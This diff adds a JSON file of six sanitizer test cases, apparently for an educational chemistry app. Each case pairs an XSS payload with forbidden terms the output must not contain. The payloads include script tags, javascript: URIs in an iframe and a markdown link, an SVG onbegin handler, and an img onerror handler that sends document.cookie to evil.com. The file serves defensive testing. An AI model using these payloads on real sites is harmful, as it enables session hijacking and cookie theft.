@@ -1,0 +1,80 @@
+[
+  {
+    "id": "inp-001",
+    "category": "input-security",
+    "name": "Classic Script Tag XSS Injection",
+    "description": "Tests that raw <script> tags are fully stripped or escaped from output rendering.",
+    "severity": "CRITICAL",
+    "input": "<script>alert('XSS_BREACH')</script>Explain exothermic reactions",
+    "expectedBehavior": "Script tags stripped; no executable JavaScript in rendered HTML.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["<script", "alert('XSS_BREACH')"]
+    }
+  },
+  {
+    "id": "inp-002",
+    "category": "input-security",
+    "name": "Image Onerror Event Handler XSS",
+    "description": "Tests that HTML event handlers (onerror, onload, onclick) are purged.",
+    "severity": "CRITICAL",
+    "input": "<img src=\"invalid-image.jpg\" onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">",
+    "expectedBehavior": "Event handler 'onerror' is removed by sanitizeHtml.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["onerror", "document.cookie"]
+    }
+  },
+  {
+    "id": "inp-003",
+    "category": "input-security",
+    "name": "Iframe & Object Embed Injection",
+    "description": "Tests that <iframe>, <object>, and <embed> tags are eliminated.",
+    "severity": "HIGH",
+    "input": "<iframe src=\"javascript:alert('pwn')\"></iframe>What is copper sulfate?",
+    "expectedBehavior": "Iframe tags are completely stripped.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["<iframe", "javascript:alert"]
+    }
+  },
+  {
+    "id": "inp-004",
+    "category": "input-security",
+    "name": "Markdown Link Javascript URI Injection",
+    "description": "Tests that markdown links containing 'javascript:' schemes are disarmed.",
+    "severity": "HIGH",
+    "input": "[Click to view revision notes](javascript:alert(document.domain))",
+    "expectedBehavior": "javascript: pseudo-protocol is sanitized/removed.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["javascript:"]
+    }
+  },
+  {
+    "id": "inp-005",
+    "category": "input-security",
+    "name": "Malformed Unicode & Null Byte Stripping",
+    "description": "Tests handling of null bytes (\\u0000) and surrogate pairs that could cause parser bugs.",
+    "severity": "MEDIUM",
+    "input": "H2SO4\u0000<script>alert(1)</script>\uD800\uDFFF",
+    "expectedBehavior": "Input handled gracefully without crashing parser or bypassing filter.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["<script"]
+    }
+  },
+  {
+    "id": "inp-006",
+    "category": "input-security",
+    "name": "SVG Onload Payload Injection",
+    "description": "Tests SVG vectors with embedded scripts.",
+    "severity": "HIGH",
+    "input": "<svg><animatetransform onbegin=alert(1) attributeName=transform></animatetransform></svg>",
+    "expectedBehavior": "SVG event handlers disarmed.",
+    "assertions": {
+      "type": "sanitized_xss",
+      "forbiddenTerms": ["onbegin", "alert(1)"]
+    }
+  }
+]
